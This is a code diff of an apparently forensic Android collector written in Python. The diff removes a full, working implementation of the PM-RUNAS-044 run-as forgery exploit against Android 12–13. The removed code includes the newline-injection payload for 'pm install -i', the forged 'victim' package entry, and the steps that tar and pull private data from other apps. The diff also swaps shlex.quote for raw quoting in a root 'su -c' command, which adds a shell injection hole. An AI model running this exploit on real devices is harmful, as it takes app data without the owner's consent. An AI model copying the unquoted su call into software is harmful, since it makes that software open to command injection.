@@ -172,7 +172,6 @@ class DeviceInfo:
     android_version: str
     sdk_version: int
     usb_debugging: bool
-    security_patch: str = ''
     rooted: bool = False
     storage_available: int = 0
     vendor_id: int = 0
@@ -232,7 +231,7 @@ ANDROID_ARTIFACT_TYPES = {
                 'services': ['battery', 'wifi', 'netpolicy', 'usagestats', 'activity'],
             },
             'settings': {'name': 'Device Settings'},
-            'notification_log': {'name': 'Notification History'},
+            'notifications': {'name': 'Notification History'},
             'accounts': {'name': 'Registered Accounts'},
             'app_usage': {'name': 'App Usage Statistics'},
             'connectivity': {'name': 'Network Connectivity'},
@@ -1248,7 +1247,6 @@ class ADBDeviceMonitor:
             android_version = shell_cmd('getprop ro.build.version.release')
             sdk_str = shell_cmd('getprop ro.build.version.sdk')
             sdk_version = int(sdk_str) if sdk_str.isdigit() else 0
-            security_patch = shell_cmd('getprop ro.build.version.security_patch')
 
             # Check root status
             root_check = shell_cmd('which su')
@@ -1260,7 +1258,6 @@ class ADBDeviceMonitor:
                 manufacturer=manufacturer or device_dict.get('manufacturer', 'Unknown'),
                 android_version=android_version or 'Unknown',
                 sdk_version=sdk_version,
-                security_patch=security_patch or '',
                 usb_debugging=True,  # Successfully connected
                 rooted=rooted,
                 vendor_id=device_dict.get('vendor_id', 0),
@@ -1715,12 +1712,6 @@ class AndroidCollector:
             )
             if result.returncode == 0 and b'ok' in result.stdout:
                 self._device = None  # No libusb device, use system adb fallback
-                self._system_adb_path = adb_path
-
-                # Populate device_info if not set (libusb enumeration may have skipped it)
-                if not self.device_info:
-                    self.device_info = self._build_device_info_from_adb(adb_path)
-
                 logger.info(
                     f"[Android] Connected via system adb fallback: {self.device_serial} "
                     f"(adb={adb_path})"
@@ -1734,47 +1725,6 @@ class AndroidCollector:
             f"libusb driver not compatible and system adb connection failed. "
             f"Check USB debugging is enabled and authorized on the device."
         )
-
-    def _build_device_info_from_adb(self, adb_path: str) -> DeviceInfo:
-        """Build DeviceInfo from system adb getprop (fallback when libusb unavailable)"""
-        def _getprop(key: str) -> str:
-            try:
-                r = subprocess.run(
-                    [adb_path, '-s', self.device_serial, 'shell', 'getprop', key],
-                    capture_output=True, timeout=5,
-                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
-                )
-                return r.stdout.decode('utf-8', errors='replace').strip()
-            except Exception:
-                return ''
-
-        # Check root
-        rooted = False
-        try:
-            r = subprocess.run(
-                [adb_path, '-s', self.device_serial, 'shell', 'su', '-c', 'id'],
-                capture_output=True, timeout=5,
-                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
-            )
-            rooted = r.returncode == 0 and b'uid=0' in r.stdout
-        except Exception:
-            pass
-
-        sdk_str = _getprop('ro.build.version.sdk')
-        return DeviceInfo(
-            serial=self.device_serial,
-            model=_getprop('ro.product.model') or 'Unknown',
-            manufacturer=_getprop('ro.product.manufacturer') or 'Unknown',
-            android_version=_getprop('ro.build.version.release') or 'Unknown',
-            sdk_version=int(sdk_str) if sdk_str.isdigit() else 0,
-            usb_debugging=True,
-            security_patch=_getprop('ro.build.version.security_patch'),
-            rooted=rooted,
-        )
-
-    def close(self):
-        """Close and cleanup resources (alias for disconnect)"""
-        self.disconnect()
 
     def disconnect(self):
         """Disconnect from the device"""
@@ -1810,7 +1760,7 @@ class AndroidCollector:
             Tuple of (output, return_code)
         """
         if use_su:
-            cmd = f'su -c {shlex.quote(cmd)}'
+            cmd = f'su -c "{cmd}"'
 
         for attempt in range(self.MAX_RETRIES):
             try:
@@ -2323,9 +2273,9 @@ class AndroidCollector:
                 )
             elif sub_key == 'settings':
                 yield from self._collect_settings(sub_artifact_type, sub_dir, progress_callback)
-            elif sub_key == 'notification_log':
+            elif sub_key == 'notifications':
                 yield from self._collect_notification_log(
-                    sub_artifact_type, sub_dir, progress_callback
+                    'mobile_android_notification_log', sub_dir, progress_callback
                 )
             elif sub_key == 'accounts':
                 yield from self._collect_account_info(
@@ -2922,23 +2872,10 @@ class AndroidCollector:
                     }
 
         # ----- Phase 2: run-as for debuggable apps -----
-        phase2_collected = False
         if db_paths:
-            for item in self._collect_runas_app_data(
+            yield from self._collect_runas_app_data(
                 artifact_type, package, db_paths, output_dir, progress_callback
-            ):
-                phase2_collected = True
-                yield item
-
-        # ----- Phase 3: PM-RUNAS-044 elevated access (Android 12-13) -----
-        # Only attempt if Phase 2 (run-as) failed and device is applicable
-        if not phase2_collected and package:
-            sdk = self.device_info.sdk_version if self.device_info else 0
-            patch = self.device_info.security_patch if self.device_info else ''
-            if 31 <= sdk <= 33 and (not patch or patch < '2024-10-01'):
-                yield from self._collect_via_elevated_access(
-                    artifact_type, package, db_paths, output_dir, progress_callback
-                )
+            )
 
         # Summary log
         if progress_callback:
@@ -3047,281 +2984,6 @@ class AndroidCollector:
                     'package': package,
                     'source': 'debuggable_app',
                 }
-
-    def _collect_via_elevated_access(
-        self,
-        artifact_type: str,
-        package: str,
-        db_paths: List[str],
-        output_dir: Path,
-        progress_callback: Optional[Callable[[str], None]]
-    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
-        """
-        Access-method PM-RUNAS-044 to extract private app data from non-debuggable apps.
-
-        This method applies to Android 12 (SDK 31), 12L (SDK 32), and 13 (SDK 33).
-        It uses a newline insertion technique in PackageInstallerService.java's
-        createSessionInternal() function, allowing 'run-as any app' elevated access.
-
-        Reference: https://github.com/0xbinder/PM-RUNAS-044
-        Advisory: https://rtx.meta.security/analysis/2024/03/04/Android-run-as-forgery.html
-
-        Steps:
-            1. Get target package UID
-            2. Find/push a helper APK for the access method
-            3. Execute access sequence via pm install -i
-            4. Use 'run-as victim' to access target app data
-            5. Extract data via tar and pull to local
-        """
-        sdk = int(self.device_info.sdk_version or 0)
-
-        # PM-RUNAS-044 only affects Android 12-13 (SDK 31-33)
-        if sdk < 31 or sdk > 33:
-            logger.debug(f"[PM-RUNAS-044] SDK {sdk} not applicable (requires 31-33)")
-            return
-
-        if progress_callback:
-            progress_callback(f"[PM-RUNAS-044] Attempting elevated access for {package}")
-
-        logger.info(f"[PM-RUNAS-044] Accessing data for package: {package} (SDK {sdk})")
-
-        # Step 1: Get target package UID
-        uid = self._get_target_package_uid(package)
-        if not uid:
-            logger.warning(f"[PM-RUNAS-044] Failed to get UID for {package}")
-            return
-
-        # Step 2: Find a dummy APK on device or push one
-        dummy_apk = self._find_or_push_helper_apk()
-        if not dummy_apk:
-            logger.warning("[PM-RUNAS-044] No APK available for access method")
-            return
-
-        apk_filename = Path(dummy_apk).name
-
-        # Step 3: Execute the access sequence
-        access_success = self._execute_access_sequence(uid, apk_filename)
-        if not access_success:
-            logger.warning("[PM-RUNAS-044] Access sequence failed")
-            return
-
-        # Step 4: Setup extraction directory
-        extract_dir = '/data/local/tmp/adv_extract'
-        tar_path = f'{extract_dir}/app_data.tar'
-
-        setup_cmds = [
-            f'rm -rf {extract_dir}',
-            f'mkdir -p {extract_dir}',
-            f'touch {tar_path}',
-            f'chmod -R 0777 {extract_dir}',
-        ]
-        for cmd in setup_cmds:
-            self._adb_shell(cmd)
-
-        # Step 5: Use 'run-as victim' to tar the target app data
-        # The method creates a temporary "victim" package entry pointing to target app's data
-        tar_cmd = f'run-as victim sh -c "cd /data/data && tar -cf {tar_path} {shlex.quote(package)} 2>/dev/null"'
-        _, rc = self._adb_shell(tar_cmd)
-
-        if rc != 0:
-            # Alternative: try direct tar without cd
-            tar_cmd_alt = f'run-as victim tar -cf {tar_path} -C /data/data {shlex.quote(package)} 2>/dev/null'
-            _, rc = self._adb_shell(tar_cmd_alt)
-
-        if rc != 0:
-            logger.warning(f"[PM-RUNAS-044] Failed to tar {package} data")
-            self._cleanup_access_temp(extract_dir)
-            return
-
-        # Step 6: Pull tar file to local
-        local_tar_path = output_dir / 'advanced_access' / f'{package}_data.tar'
-        local_tar_path.parent.mkdir(parents=True, exist_ok=True)
-
-        try:
-            success = self._adb_pull(tar_path, str(local_tar_path))
-        except Exception as e:
-            logger.error(f"[PM-RUNAS-044] Pull failed: {e}")
-            self._cleanup_access_temp(extract_dir)
-            return
-
-        if not success or not local_tar_path.exists() or local_tar_path.stat().st_size == 0:
-            logger.warning("[PM-RUNAS-044] Tar file pull failed or empty")
-            self._cleanup_access_temp(extract_dir)
-            return
-
-        # Step 7: Extract tar and yield artifacts
-        extract_local_dir = output_dir / 'advanced_access' / package
-        extract_local_dir.mkdir(parents=True, exist_ok=True)
-
-        try:
-            import tarfile
-            with tarfile.open(local_tar_path, 'r') as tar:
-                # [SECURITY] Path traversal prevention — filter members before extraction
-                safe_members = []
-                resolved_base = extract_local_dir.resolve()
-                for member in tar.getmembers():
-                    # Block symlinks and hardlinks (can point outside extraction dir)
-                    if member.issym() or member.islnk():
-                        logger.warning(f"[PM-RUNAS-044] Skipping symlink/hardlink tar member: {member.name}")
-                        continue
-                    member_path = (extract_local_dir / member.name).resolve()
-                    if not str(member_path).startswith(str(resolved_base)):
-                        logger.warning(f"[PM-RUNAS-044] Skipping unsafe tar member: {member.name}")
-                        continue
-                    safe_members.append(member)
-                tar.extractall(path=extract_local_dir, members=safe_members)
-
-            if progress_callback:
-                progress_callback(f"[PM-RUNAS-044] Extracted {package} data successfully")
-
-            # Yield extracted files matching db_paths or all files if no specific paths
-            for root, _, files in os.walk(extract_local_dir):
-                for fname in files:
-                    fpath = Path(root) / fname
-                    rel_path = fpath.relative_to(extract_local_dir)
-
-                    # Filter by db_paths if specified
-                    if db_paths:
-                        matched = any(
-                            str(rel_path).endswith(db_p.lstrip('./'))
-                            or Path(db_p).name == fname
-                            for db_p in db_paths
-                        )
-                        if not matched:
-                            continue
-
-                    sha256 = hashlib.sha256()
-                    with open(fpath, 'rb') as f:
-                        for chunk in iter(lambda: f.read(65536), b''):
-                            sha256.update(chunk)
-
-                    yield str(fpath), {
-                        'artifact_type': artifact_type,
-                        'original_path': f'/data/data/{package}/{rel_path}',
-                        'filename': fname,
-                        'size': fpath.stat().st_size,
-                        'sha256': sha256.hexdigest(),
-                        'device_serial': self.device_info.serial,
-                        'device_model': self.device_info.model,
-                        'android_version': self.device_info.android_version,
-                        'collected_at': datetime.utcnow().isoformat(),
-                        'collection_method': 'pm_runas_044',
-                        'root_used': False,
-                        'package': package,
-                        'source': 'elevated_access',
-                        'access_method_id': 'PM-RUNAS-044',
-                    }
-
-        except Exception as e:
-            logger.error(f"[PM-RUNAS-044] Extraction failed: {e}")
-        finally:
-            # Cleanup
-            self._cleanup_access_temp(extract_dir)
-
-    def _get_target_package_uid(self, package: str) -> Optional[str]:
-        """Get the UID of a package for PM-RUNAS-044 access method."""
-        cmd = f'pm list packages -U 2>/dev/null | grep -F "package:{package} "'
-        output, rc = self._adb_shell(cmd)
-
-        if rc != 0 or not output:
-            # Fallback: try dumpsys
-            cmd_alt = f'dumpsys package {shlex.quote(package)} 2>/dev/null | grep -E "userId="'
-            output, _ = self._adb_shell(cmd_alt)
-            if output:
-                match = re.search(r'userId=(\d+)', output)
-                if match:
-                    return match.group(1)
-            return None
-
-        # Parse: package:com.example.app uid:10123
-        match = re.search(r'uid:(\d+)', output)
-        if match:
-            uid = match.group(1)
-            logger.debug(f"[PM-RUNAS-044] Got UID {uid} for {package}")
-            return uid
-        return None
-
-    def _find_or_push_helper_apk(self) -> Optional[str]:
-        """Find an existing APK on device or return None."""
-        # Check for common pre-existing APKs in /data/local/tmp
-        check_cmd = 'ls /data/local/tmp/*.apk 2>/dev/null | head -1'
-        output, rc = self._adb_shell(check_cmd)
-
-        if rc == 0 and output and output.strip().endswith('.apk'):
-            apk_path = output.strip().split('\n')[0]
-            logger.debug(f"[PM-RUNAS-044] Found existing APK: {apk_path}")
-            return apk_path
-
-        # Check for any system APK we can reference (read-only, but usable)
-        system_apk_cmd = 'pm path com.android.settings 2>/dev/null | head -1'
-        output, rc = self._adb_shell(system_apk_cmd)
-
-        if rc == 0 and output:
-            # Output format: package:/system/priv-app/Settings/Settings.apk
-            match = re.search(r'package:(.+\.apk)', output)
-            if match:
-                apk_path = match.group(1)
-                # Copy to /data/local/tmp for the access method
-                tmp_apk = '/data/local/tmp/helper_access.apk'
-                copy_cmd = f'cp {shlex.quote(apk_path)} {tmp_apk} 2>/dev/null'
-                _, rc = self._adb_shell(copy_cmd)
-                if rc == 0:
-                    logger.debug(f"[PM-RUNAS-044] Copied system APK to {tmp_apk}")
-                    return tmp_apk
-
-        logger.warning("[PM-RUNAS-044] No suitable APK found on device")
-        return None
-
-    def _execute_access_sequence(self, uid: str, apk_filename: str) -> bool:
-        """
-        Execute the PM-RUNAS-044 payload injection.
-
-        The sequence uses newline insertion in pm install -i parameter
-        to create a fake 'victim' entry in /data/system/packages.list.
-        """
-        # Construct the payload: newline injection in -i (installer) parameter
-        # creates fake 'victim' entry in /data/system/packages.list
-        # Using $'...' syntax for shell to interpret \n as newline
-        payload = (
-            f"@null\\nvictim {uid} 1 /data/user/0 "
-            f"default:targetSdkVersion=28 none 0 0 1 @null"
-        )
-        install_cmd = (
-            f"pm install -i $'{payload}' "
-            f"/data/local/tmp/{shlex.quote(apk_filename)} 2>&1"
-        )
-
-        output, rc = self._adb_shell(install_cmd)
-
-        # Check for success - the install itself may fail but the injection might work
-        if output and 'Success' in output:
-            logger.info("[PM-RUNAS-044] Payload injection succeeded")
-            return True
-
-        # Even if install reports failure, the injection may have worked
-        # Verify by testing run-as victim
-        test_cmd = 'run-as victim id 2>&1'
-        test_output, test_rc = self._adb_shell(test_cmd)
-
-        if test_rc == 0 and test_output and 'uid=' in test_output:
-            logger.info("[PM-RUNAS-044] Payload injection verified via run-as")
-            return True
-
-        logger.debug(f"[PM-RUNAS-044] Install output: {output}")
-        return False
-
-    def _cleanup_access_temp(self, extract_dir: str) -> None:
-        """Clean up PM-RUNAS-044 access artifacts from device."""
-        cleanup_cmds = [
-            f'rm -rf {extract_dir}',
-            'rm -f /data/local/tmp/helper_access.apk 2>/dev/null',
-            'pm uninstall victim 2>/dev/null',  # Try to clean up fake package
-        ]
-        for cmd in cleanup_cmds:
-            try:
-                self._adb_shell(cmd)
-            except Exception:
-                pass
 
     def _parse_ls_recursive(self, base_path: str, ls_output: str) -> str:
         """Parse `ls -R` output into a newline-separated list of full file paths."""
@@ -3604,22 +3266,16 @@ class AndroidCollector:
     def _find_system_adb(self) -> Optional[str]:
         """
         Locate adb binary: bundled first, then system fallback.
-        Results are cached in self._system_adb_path to avoid repeated filesystem scans.
 
         Search order:
-        1. Cached path (if previously found and still exists)
-        2. Bundled adb (PyInstaller _MEIPASS/resources/adb/)
-        3. Bundled adb (source tree resources/adb/)
-        4. Common system installation paths
-        5. PATH environment variable
+        1. Bundled adb (PyInstaller _MEIPASS/resources/adb/)
+        2. Bundled adb (source tree resources/adb/)
+        3. Common system installation paths
+        4. PATH environment variable
 
         Returns:
             Path to adb executable, or None if not found
         """
-        # Use cached path if still valid
-        cached = getattr(self, '_system_adb_path', None)
-        if cached and os.path.isfile(cached):
-            return cached
         search_paths = []
 
         # Priority 1: Bundled adb (inside PyInstaller EXE or source tree)
@@ -3653,14 +3309,12 @@ class AndroidCollector:
         for path in search_paths:
             if os.path.isfile(path):
                 logger.info(f"Found system adb: {path}")
-                self._system_adb_path = path
                 return path
 
         # Try PATH
         adb_in_path = shutil.which('adb')
         if adb_in_path:
             logger.info(f"Found adb in PATH: {adb_in_path}")
-            self._system_adb_path = adb_in_path
             return adb_in_path
 
         return None
